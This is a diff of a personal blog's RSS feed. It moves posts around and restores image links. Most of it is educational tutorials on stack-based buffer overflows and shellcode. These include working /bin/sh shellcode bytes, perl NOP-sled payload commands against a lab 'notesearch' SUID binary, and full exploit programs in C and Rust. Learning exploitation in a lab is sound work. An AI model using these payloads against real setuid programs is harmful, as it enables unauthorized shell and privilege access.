+&lt;p&gt;With that, we go down to ~0.82s and get the &lt;a href=&quot;https://github.com/danielorihuela/dotfiles/blob/master/emacs/config.org&quot;&gt;final
+config&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/speed-up-emacs-init/config-org-tangle.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Emacs is easy to configure, but hard to optimize. Try all the tricks
+above and check for some more on the internet.&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/emacs-logo.DuuBcpPG.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Store shellcode in environment variable</title><link>https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</guid><description>Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows.</description><pubDate>Sun, 29 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#manually-store-shellcode-in-env-var&quot;&gt;Manually store shellcode in env
+var&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#automating-the-attack&quot;&gt;Automating the attack&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In the &lt;a href=&quot;../stack-based-buffer-overflows&quot;&gt;previous post&lt;/a&gt; we explained how
+stack-based buffer overflows work. In the last exercise, we inserted the
+shellcode in the stack. However, this might be a problem. What happens
+if the shellcode doesn&apos;t fit in the stack? We can store it in an
+environment variable.&lt;/p&gt;
+&lt;h1&gt;Manually store shellcode in env var&lt;/h1&gt;
+&lt;p&gt;We will export the shellcode manually and use it in our exploit.&lt;/p&gt;
+&lt;p&gt;Let&apos;s keep working with the &lt;code&gt;notesearch&lt;/code&gt; program (the last exercise of
+the previous post). Remember that the shellcode was
+&lt;code&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/code&gt;.
+We need to export it as a binary into the env var. Otherwise, the code
+won&apos;t be executed.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo -e &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot; &amp;gt; shellcode.bin
+export SHELLCODE=$(cat shellcode.bin)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The terminal will complain about the encoding but don&apos;t worry. It&apos;s
+still working.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/wrong-encoding.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The next step is debugging the exploit and searching the address where
+the environment variable is in the stack. Environment variables are in
+the lowest positions.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;env gdb ~/Desktop/overflow/notesearch
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can place a break in the main function to inspect the stack frame.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/shellcode-location-env-var.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The shellcode is at &lt;code&gt;0x7fffffffe975&lt;/code&gt;. Notice that if the user adds or
+removes environment variables, the memory address will change. We can
+execute
+&lt;code&gt;~/Desktop/overflow/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\x75\xe9\xff\xff\xff\x7f&quot;&apos;)&lt;/code&gt;.
+Remember, we use the first 120 bytes to reach the return address memory
+location.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/manual-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Automating the attack&lt;/h1&gt;
+&lt;p&gt;Another advantage of storing the shellcode in an environment variable is
+that automating the attack is easier. C
+&lt;a href=&quot;https://linux.die.net/man/3/execl&quot;&gt;execle&lt;/a&gt; function allows to execute
+files with the given arguments and environment variables.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;int execle(const char *path, const char *arg,..., char * const envp[]);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We can execute the binary with just the shellcode in the environment
+variables. Hence, we get rid of other environment variables that could
+modify the memory address. We can use gdb, as before, to get the new
+memory address. There&apos;s one difference, though. Since we want to debug
+the program called with &lt;code&gt;execle&lt;/code&gt;, we need to allow gdb to debug it.
+Execute &lt;code&gt;set follow-fork-mode child&lt;/code&gt; in gdb and add a break to the main
+function. It will eventually stop in &lt;code&gt;notesearch&lt;/code&gt;. Once there, search
+the shellcode in the stack frame as we did before.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/follow-child.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The exploit in C is quite self-explanatory. We create the argument, the
+environment and execute &lt;code&gt;notesearch&lt;/code&gt; with them.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;stdint.h&amp;gt;
+
+char shellcode[]=&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;;
+
+int main(int argc, char *argv[]) {
+    char buffer[120 + 8];
+    memset(buffer, &apos;a&apos;, 120);
+    memcpy(&amp;amp;buffer[120], &quot;\x75\xe9\xff\xff\xff\x7f&quot;, 8);
+
+    char* env[2] = {shellcode, 0};
+    execle(&quot;notesearch&quot;, &quot;./notesearch&quot;, buffer, 0, env);
+    free(buffer);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/c-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;The same exploit in Rust.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;use std::ffi::OsStr;
+use std::process::Command;
+
+fn main() {
+    let shellcode = unsafe {
+        OsStr::from_encoded_bytes_unchecked(&amp;amp;[
+            0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
+            0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
+        ])
+    };
+
+    let shellcode_address = [0xd3, 0xef, 0xff, 0xff, 0xff, 0x7f];
+    let memory = [0x61; 120]
+        .iter()
+        .chain(shellcode_address.iter())
+        .map(|x| *x as u8)
+        .collect::&amp;lt;Vec&amp;lt;u8&amp;gt;&amp;gt;();
+    let memory_arg = unsafe { OsStr::from_encoded_bytes_unchecked(&amp;amp;memory) };
+
+    Command::new(&quot;./notesearch&quot;)
+        .arg(memory_arg)
+        .env_clear()
+        .env(&quot;SHELLCODE&quot;, shellcode)
+        .spawn()
+        .unwrap()
+        .wait_with_output()
+        .unwrap();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow-env-var/rust-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded><image>https://danielorihuela.dev/_astro/shellcode-env-var.CG5A6neK.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Stack-based buffer overflows</title><link>https://danielorihuela.dev/blog/stack-based-buffer-overflows/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/stack-based-buffer-overflows/</guid><description>Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them.</description><pubDate>Fri, 20 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;#whats-a-buffer-overflow&quot;&gt;What&apos;s a buffer overflow?&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#whats-the-stack&quot;&gt;What&apos;s the stack?&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;#how-to-exploit-stack-based-buffer-overflows&quot;&gt;How to exploit stack based buffer
@@ -3334,7 +3438,7 @@ the caller thanks to the return address. Now, on the top of the stack,
 we have the stack frame from the resumed function. The program is ready
 to go.&lt;/p&gt;
 &lt;p&gt;Stack example:&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/stack-frame-graph.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Great! We understand the basis of how the stack works at a high level.
 However, we still need to know the low-level details of that process if
 we want to exploit it. So, what&apos;s actually happening? How does the
@@ -3426,7 +3530,7 @@ expected.&lt;/p&gt;
 ./auth_overflow &quot;password&quot;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;I&apos;ve tried with several lengths. With 25 characters, the program fails.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-stack-smashing.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;There&apos;s something curious, though. The function variables only take 20
 bytes, 16 for the &lt;code&gt;password_buffer&lt;/code&gt; and 4 for the &lt;code&gt;auth_flag&lt;/code&gt;, but we
 need 25 bytes to make it fail. I did some research, and it seems like it
@@ -3439,7 +3543,7 @@ frame at the beginning of the function and expects that it remains
 unchanged when exiting it. Let&apos;s disable that for our learning.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;gcc auth_overflow.c -o auth_overflow -fno-stack-protector
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-no-stack-protector.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;With canaries disabled, let&apos;s see how many bytes are between the
 &lt;code&gt;password_buffer&lt;/code&gt; and the &lt;code&gt;auth_flag&lt;/code&gt;. That will tell us the password
 length needed to overwrite the &lt;code&gt;auth_flag&lt;/code&gt;. For that, we can use gdb.
@@ -3448,16 +3552,16 @@ function and checking the memory addresses.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;gcc auth_overflow.c -o auth_overflow -fno-stack-protector -g # -g option adds debug symbols
 gdb ./auth_overflow
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-gdb-variables-distance.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;There are 28 bytes between the two variables. That means that we need a
 password with 29 characters. The first 28 to fill the space between the
 variables, and the last one to overwrite the &lt;code&gt;auth_flag&lt;/code&gt;. We need it to
 be different to 0. For example, &quot;a&quot; should overwrite the &lt;code&gt;auth_flag&lt;/code&gt;
 value with its ASCII decimal value (97). We can see that in action by
 placing a couple of breakpoints. One before the &lt;code&gt;strcpy&lt;/code&gt; and one after.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-auth-flag-new-value.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That&apos;s it! We got the &quot;Access Granted&quot; message.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow-access-granted.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Overwrite return address&lt;/h2&gt;
 &lt;p&gt;The first example is limited, right? We can do something interesting
 only if the variable we want to overwrite is stored in the stack before
@@ -3506,12 +3610,12 @@ memory address every time.&lt;/p&gt;
 first example, gdb is our friend. We can put a breakpoint inside
 &lt;code&gt;check_authentication&lt;/code&gt;, run and execute &lt;code&gt;info frame&lt;/code&gt;. The &lt;code&gt;rip&lt;/code&gt; register
 contains the return address.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-info-frame.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;At this point, it&apos;s a matter of trying several passwords until we find
 the number of bytes till the &lt;code&gt;rip&lt;/code&gt; register. Same procedure as in the
 first example. Writing a password with 40 &quot;a&quot; and 3 &quot;b&quot; will overwrite
 the &lt;code&gt;rip&lt;/code&gt; with the ASCII value of &quot;bbb&quot; (0x626262).&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-overwrite-rip.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That&apos;s cool, but we want to overwrite the &lt;code&gt;rip&lt;/code&gt; to change the code flow
 and show us the &quot;Access Granted&quot; message. We can disassemble the main
 function to see where the &lt;code&gt;print&lt;/code&gt; functions are and get the memory
@@ -3519,11 +3623,11 @@ address for the first &lt;code&gt;print&lt;/code&gt;. The +86 memory address poi
 conditional before the prints. We can take the next address. If PIE was
 enabled, this wouldn&apos;t be that easy. The address would change every time
 we run it.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-access-granted-address.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Replacing &quot;bbb&quot; with &quot;&lt;code&gt;\x&lt;/code&gt;{=latex}7f&lt;code&gt;\x12&lt;/code&gt;{=latex}&lt;code&gt;\x40&lt;/code&gt;{=latex}&quot; gives
 us the &quot;Access Granted&quot; message. We add the memory address in reverse
 because my machine uses Little Endian.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/auth-overflow2-access-granted.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2&gt;Get shell&lt;/h2&gt;
 &lt;p&gt;The second example was a bit more interesting, but still limited. In
 this final example, we are going to see how to get access to a shell.&lt;/p&gt;
@@ -3754,12 +3858,12 @@ address where the NOP sled is located.&lt;/p&gt;
 I used a &quot;NOP sled, shellcode, NOP sled address&quot; structure. It didn&apos;t
 work for multiple reasons. NX bit wasn&apos;t disabled and ASLR wasn&apos;t
 disabled.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-stack.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;After disabling them, the issue was creating the correct payload.
 Sometimes, the execution failed with a SEGFAULT and sometimes with a
 SIGILL. Trying a myriad of different payload structures and lengths for
 the NOP operations, I finally crafted a payload that worked using gdb.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-gdb-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;This payload doesn&apos;t work outside gdb. The environment in which we
 execute the exploit can modify the position of the variables in the
 stack. For example, the environment variables used on gdb differ from
@@ -3772,7 +3876,7 @@ environment variables to gdb.&lt;/p&gt;
 didn&apos;t work for me, while
 &lt;code&gt;~/Desktop/overflow/notesearch $(perl -e &apos;print &quot;\x90&quot; x 57, &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;, &quot;\x90&quot; x 40, &quot;\x90\xe3\xff\xff\xff\x7f\x00\x00&quot;&apos;)&lt;/code&gt;
 worked.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/stack-based-buffer-overflow/notesearch-final-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That&apos;s it!!! We got our shell. In theory, we should get root access due
 to the SUID permissions. However, some shells now throw SUID permissions
 when spawning new shells from a process with SUID to avoid this kind of
@@ -3786,111 +3890,7 @@ the exercise: canaries, PIE, ASLR or NX bit.&lt;/p&gt;
 &lt;p&gt;Now we know what a stack based buffer overflow is, why it works, how to
 exploit it and some protections mechanisms. We don&apos;t have an execuse to
 avoid them.&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Store shellcode in environment variable</title><link>https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/store-shellcode-in-environment-variable/</guid><description>Learn how to store the shellcode in an environment variable and bypass size limitations in buffer overflows.</description><pubDate>Sun, 29 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;#manually-store-shellcode-in-env-var&quot;&gt;Manually store shellcode in env
-var&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;#automating-the-attack&quot;&gt;Automating the attack&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;In the &lt;a href=&quot;../stack-based-buffer-overflows&quot;&gt;previous post&lt;/a&gt; we explained how
-stack-based buffer overflows work. In the last exercise, we inserted the
-shellcode in the stack. However, this might be a problem. What happens
-if the shellcode doesn&apos;t fit in the stack? We can store it in an
-environment variable.&lt;/p&gt;
-&lt;h1&gt;Manually store shellcode in env var&lt;/h1&gt;
-&lt;p&gt;We will export the shellcode manually and use it in our exploit.&lt;/p&gt;
-&lt;p&gt;Let&apos;s keep working with the &lt;code&gt;notesearch&lt;/code&gt; program (the last exercise of
-the previous post). Remember that the shellcode was
-&lt;code&gt;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&lt;/code&gt;.
-We need to export it as a binary into the env var. Otherwise, the code
-won&apos;t be executed.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;echo -e &quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot; &amp;gt; shellcode.bin
-export SHELLCODE=$(cat shellcode.bin)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;The terminal will complain about the encoding but don&apos;t worry. It&apos;s
-still working.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The next step is debugging the exploit and searching the address where
-the environment variable is in the stack. Environment variables are in
-the lowest positions.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;env gdb ~/Desktop/overflow/notesearch
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;We can place a break in the main function to inspect the stack frame.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The shellcode is at &lt;code&gt;0x7fffffffe975&lt;/code&gt;. Notice that if the user adds or
-removes environment variables, the memory address will change. We can
-execute
-&lt;code&gt;~/Desktop/overflow/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\x75\xe9\xff\xff\xff\x7f&quot;&apos;)&lt;/code&gt;.
-Remember, we use the first 120 bytes to reach the return address memory
-location.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;h1&gt;Automating the attack&lt;/h1&gt;
-&lt;p&gt;Another advantage of storing the shellcode in an environment variable is
-that automating the attack is easier. C
-&lt;a href=&quot;https://linux.die.net/man/3/execl&quot;&gt;execle&lt;/a&gt; function allows to execute
-files with the given arguments and environment variables.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;int execle(const char *path, const char *arg,..., char * const envp[]);&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;We can execute the binary with just the shellcode in the environment
-variables. Hence, we get rid of other environment variables that could
-modify the memory address. We can use gdb, as before, to get the new
-memory address. There&apos;s one difference, though. Since we want to debug
-the program called with &lt;code&gt;execle&lt;/code&gt;, we need to allow gdb to debug it.
-Execute &lt;code&gt;set follow-fork-mode child&lt;/code&gt; in gdb and add a break to the main
-function. It will eventually stop in &lt;code&gt;notesearch&lt;/code&gt;. Once there, search
-the shellcode in the stack frame as we did before.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The exploit in C is quite self-explanatory. We create the argument, the
-environment and execute &lt;code&gt;notesearch&lt;/code&gt; with them.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;stdint.h&amp;gt;
-
-char shellcode[]=&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;;
-
-int main(int argc, char *argv[]) {
-    char buffer[120 + 8];
-    memset(buffer, &apos;a&apos;, 120);
-    memcpy(&amp;amp;buffer[120], &quot;\x75\xe9\xff\xff\xff\x7f&quot;, 8);
-
-    char* env[2] = {shellcode, 0};
-    execle(&quot;notesearch&quot;, &quot;./notesearch&quot;, buffer, 0, env);
-    free(buffer);
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The same exploit in Rust.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;use std::ffi::OsStr;
-use std::process::Command;
-
-fn main() {
-    let shellcode = unsafe {
-        OsStr::from_encoded_bytes_unchecked(&amp;amp;[
-            0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68,
-            0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
-        ])
-    };
-
-    let shellcode_address = [0xd3, 0xef, 0xff, 0xff, 0xff, 0x7f];
-    let memory = [0x61; 120]
-        .iter()
-        .chain(shellcode_address.iter())
-        .map(|x| *x as u8)
-        .collect::&amp;lt;Vec&amp;lt;u8&amp;gt;&amp;gt;();
-    let memory_arg = unsafe { OsStr::from_encoded_bytes_unchecked(&amp;amp;memory) };
-
-    Command::new(&quot;./notesearch&quot;)
-        .arg(memory_arg)
-        .env_clear()
-        .env(&quot;SHELLCODE&quot;, shellcode)
-        .spawn()
-        .unwrap()
-        .wait_with_output()
-        .unwrap();
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
-</content:encoded><image>https://danielorihuela.dev/_astro/shellcode-env-var.CG5A6neK.jpg</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Why the Clojure REPL is so cool</title><link>https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</guid><description>Discover why the Clojure REPL experience is superior, and how to harness its power for smoother coding.</description><pubDate>Sun, 28 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;A couple of weeks ago, I started a side project. The idea is to create a
+</content:encoded><image>https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>Why the Clojure REPL is so cool</title><link>https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/why-the-clojure-repl-is-so-cool/</guid><description>Discover why the Clojure REPL experience is superior, and how to harness its power for smoother coding.</description><pubDate>Sun, 28 May 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;A couple of weeks ago, I started a side project. The idea is to create a
 simple book reading tracker website, and I decided to go with Clojure.
 Why? You may wonder. Well. I wanted to play with and experience a couple
 of things: building an application using a functional programming
@@ -3932,10 +3932,10 @@ ClojureScript frontend with two pages. You can check it out at
 of my &lt;a href=&quot;https://github.com/danielorihuela/bookworm-hut&quot;&gt;bookworm-hut&lt;/a&gt;
 repository. In the following image, we can see the home page, the code
 and the REPL session.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/home-panel-clean-repl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;From the REPL session, I can dispatch an event that triggers the
 redirection into the register page.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/register-panel-dispatch-repl.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;That is something that we cannot do in other languages. In Java, you
 would need to debug a Java program while running it. Set breakpoints in
 those places where you want to perform some operation. Wait for the code
@@ -3947,11 +3947,11 @@ application or losing the state. In the following image, we can see that
 I modified the navigation event to display an alert box. Notice how the
 running application acknowledges that, reloads it, and lets me execute
 it with the same application state.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/new-feature-in-runtime.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Again, we cannot do this in other languages and systems. That is the
 power of the REPL Driven Development. It can be hard to understand just
 with images, so let me show you a gif.&lt;/p&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/why-the-clojure-repl-is-so-cool/clojure-repl.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;If you still have doubts about the REPL Driven Development and how it
 works, please, look into &lt;a href=&quot;https://clojureverse.org/t/misconceptions-about-repl-driven-development/6988&quot;&gt;Misconceptions about REPL-driven
 development&lt;/a&gt;,
@@ -4098,7 +4098,7 @@ starting point.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;nasm helloworld.asm
 hexdump -C helloword
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Notice how many &lt;code&gt;00&lt;/code&gt; are there. These are the null bytes.&lt;/p&gt;
 &lt;h3&gt;Jump to the end and back&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;call&lt;/code&gt; instructions allow for &quot;long&quot; jumps. Using it for &quot;small&quot; jumps
@@ -4131,7 +4131,7 @@ bottom:
 call above
 db &quot;Hello, world!&quot;, 0x0a
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We removed some null bytes.&lt;/p&gt;
 &lt;h3&gt;Use smaller registers&lt;/h3&gt;
 &lt;p&gt;Computers have 16 registers. 64-bit registers are built on top of old
@@ -4275,7 +4275,7 @@ bottom:
 call above
 db &quot;Hello, world!&quot;, 0x0a
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/hexdump-t2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We removed all the null bytes!!! This is it. Shellcodes are just a
 matter of executing system calls and avoiding null bytes. Let&apos;s try it
 out with a hands-on exercise.&lt;/p&gt;
@@ -4318,7 +4318,7 @@ export SHELLCODE=$(cat helloworld)
 ~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch
 ~/Desktop/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\xab\xef\xff\xff\xff\x7f\x00\x00&quot;&apos;)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/write-stdout-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;Cool! We managed to take control of the program and print what we wanted
 to the stdout. This is rather dull. Let&apos;s try to get a shell prompt!!!&lt;/p&gt;
 &lt;p&gt;What would this look like in C?&lt;/p&gt;
@@ -4368,6 +4368,6 @@ export SHELLCODE=$(cat shell); \
 ~/Desktop/getenvaddr SHELLCODE ~/Desktop/notesearch; \
 ~/Desktop/notesearch $(perl -e &apos;print &quot;\x90&quot; x 120, &quot;\xb3\xef\xff\xff\xff\x7f\x00\x00&quot;&apos;)
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../../images/write-your-own-shell/shell-exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;p&gt;We got shell access!!!&lt;/p&gt;
 </content:encoded><image>https://danielorihuela.dev/_astro/write-shellcode.BPuIU2Up.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item></channel></rss>
